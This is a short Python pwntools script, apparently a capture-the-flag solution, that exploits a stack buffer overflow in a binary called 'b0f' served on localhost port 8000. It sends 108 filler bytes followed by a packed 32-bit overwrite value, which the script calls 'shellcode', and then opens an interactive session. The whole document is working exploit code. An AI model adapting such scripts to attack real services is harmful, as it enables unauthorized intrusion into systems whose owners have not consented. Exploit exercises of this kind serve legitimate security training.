from pwn import *


#r = process('./b0f')
r = remote('localhost', 8000)
print r.recvuntil(":")


shellcode = 'A'*108 + p32(21)

r.sendline(shellcode)
r.interactive()
